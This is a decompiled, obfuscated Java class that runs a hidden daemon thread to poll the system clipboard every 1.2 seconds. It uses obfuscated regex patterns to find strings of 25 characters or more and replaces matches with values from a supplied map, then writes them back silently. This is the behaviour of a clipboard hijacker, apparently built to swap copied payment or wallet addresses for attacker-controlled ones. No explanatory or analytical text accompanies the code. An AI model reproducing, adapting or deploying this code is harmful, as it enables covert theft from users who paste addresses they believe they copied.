/*
 * Decompiled with CFR 0.152.
 */
package x;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.util.Map;

public final class q {
    public static void a(Map<String, String> object) {
        if (object == null || object.isEmpty()) {
            return;
        }
        object = new Thread(() -> {
            while (true) {
                try {
                    Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
                    Object object = clipboard.getContents(null);
                    if (object != null && object.isDataFlavorSupported(DataFlavor.stringFlavor) && (object = (String)object.getTransferData(DataFlavor.stringFlavor)) != null && ((String)object).trim().length() >= 25) {
                        String string;
                        Map map2 = object;
                        object = ((String)object).trim();
                        if ((map2.containsKey($S.d(426)) && !(string = ((String)object).replaceAll($S.d(427), (String)map2.get($S.d(426)))).equals(object) ? string : (map2.containsKey($S.d(428)) && !(string = ((String)object).replaceAll($S.d(429), (String)map2.get($S.d(428)))).equals(object) ? string : (map2.containsKey($S.d(430)) && !(string = ((String)object).replaceAll($S.d(431), (String)map2.get($S.d(430)))).equals(object) ? string : (map2.containsKey($S.d(432)) && !(string = ((String)object).replaceAll($S.d(433), (String)map2.get($S.d(432)))).equals(object) ? string : (map2.containsKey($S.d(434)) && !(string = ((String)object).replaceAll($S.d(435), (String)map2.get($S.d(434)))).equals(object) ? string : (map2.containsKey($S.d(436)) && !(string = ((String)object).replaceAll($S.d(437), (String)map2.get($S.d(436)))).equals(object) ? string : (object = map2.containsKey($S.d(438)) && !(string = ((String)object).replaceAll($S.d(439), (String)map2.get($S.d(438)))).equals(object) ? string : null))))))) != null) {
                            Object object2 = object = new StringSelection((String)object);
                            clipboard.setContents((Transferable)object2, (ClipboardOwner)object2);
                        }
                    }
                }
                catch (Exception exception) {}
                try {
                    Thread.sleep(1200L);
                }
                catch (InterruptedException interruptedException) {
                    return;
                }
            }
        });
        ((Thread)object).setDaemon(true);
        ((Thread)object).start();
    }
}

